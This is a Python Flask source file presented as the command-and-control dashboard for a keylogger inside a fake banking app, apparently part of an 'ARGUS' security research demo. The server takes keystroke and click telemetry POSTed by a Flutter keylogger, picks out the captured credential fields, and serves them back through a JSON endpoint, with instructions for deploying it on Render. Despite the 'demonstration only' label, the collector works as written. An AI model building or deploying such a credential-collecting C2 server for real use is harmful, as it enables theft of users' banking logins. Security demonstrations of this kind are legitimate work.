"""
DEMONSTRATION PURPOSE ONLY
Flask C2 Dashboard for the demobankfake ARGUS research app.

Receives keystroke / button-click telemetry from the Flutter app and
displays them in a real-time web dashboard.

Deploy on Render:
    pip install -r requirements.txt
    gunicorn app:app
"""

import json
import os
import threading
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# ── In-memory event store ──────────────────────────────────────────────────
# Stores the last N events + captured credentials.
# A production demo might use Redis, but in-memory keeps things simple for
# Render's ephemeral filesystem.

MAX_EVENTS = 500
events: list[dict] = []
credentials: dict[str, str] = {}
lock = threading.Lock()

# ── API Routes ──────────────────────────────────────────────────────────────

@app.route("/", methods=["GET", "HEAD"])
def index():
    """Serve the live dashboard."""
    return render_template("index.html")


@app.route("/health", methods=["GET"])
def health():
    """Health-check endpoint for Render."""
    return jsonify({"status": "ok", "events": len(events)})


@app.route("/api/events", methods=["GET"])
def get_events():
    """Return buffered events + credentials as JSON (polled by the frontend)."""
    # Accept ?since=<iso_timestamp> for incremental polling.
    since = request.args.get("since")
    with lock:
        if since:
            filtered = [e for e in events if e.get("ts", "") > since]
        else:
            filtered = list(events)

    return jsonify({
        "events": filtered,
        "credentials": dict(credentials),
        "count": len(events),
        "server_time": datetime.now(timezone.utc).isoformat(),
    })


@app.route("/", methods=["POST"])
@app.route("/api/events", methods=["POST"])
def receive_events():
    """Accept telemetry POSTs from the Flutter keylogger."""
    body = request.get_json(silent=True)
    if body is None:
        return jsonify({"status": "error", "message": "invalid JSON"}), 400

    batch = body if isinstance(body, list) else [body]
    accepted = 0

    with lock:
        for event in batch:
            # Ensure every event has a server-side timestamp if missing.
            if "ts" not in event:
                event["ts"] = datetime.now(timezone.utc).isoformat()
            events.append(event)
            accepted += 1

            # Accumulate captured credentials.
            kind = event.get("type", "")
            if kind in ("credential_capture", "field_submit"):
                field = event.get("field", "unknown")
                value = event.get("value", "")
                credentials[field] = value

        # Prune old events so we don't grow unbounded.
        while len(events) > MAX_EVENTS:
            events.pop(0)

    print(f"[C2] Received {accepted} event(s) — total stored: {len(events)}")
    return jsonify({"status": "ok", "accepted": accepted})


@app.route("/api/clear", methods=["POST"])
def clear_events():
    """Clear all stored events (for demo resets)."""
    with lock:
        events.clear()
        credentials.clear()
    return jsonify({"status": "ok", "message": "cleared"})


# ── Startup banner ──────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 4444))
    print("+==================================================================+")
    print("|  DEMOBANKFAKE · FLASK C2 DASHBOARD                                |")
    print("|  ARGUS Cybersecurity Research Platform                            |")
    print("|  DEMONSTRATION PURPOSE ONLY                                       |")
    print("+==================================================================+")
    print(f"  Dashboard: http://localhost:{port}/")
    print(f"  API POST:  http://localhost:{port}/")
    print(f"  Ready to receive events ...\n")
    app.run(host="0.0.0.0", port=port, debug=False)
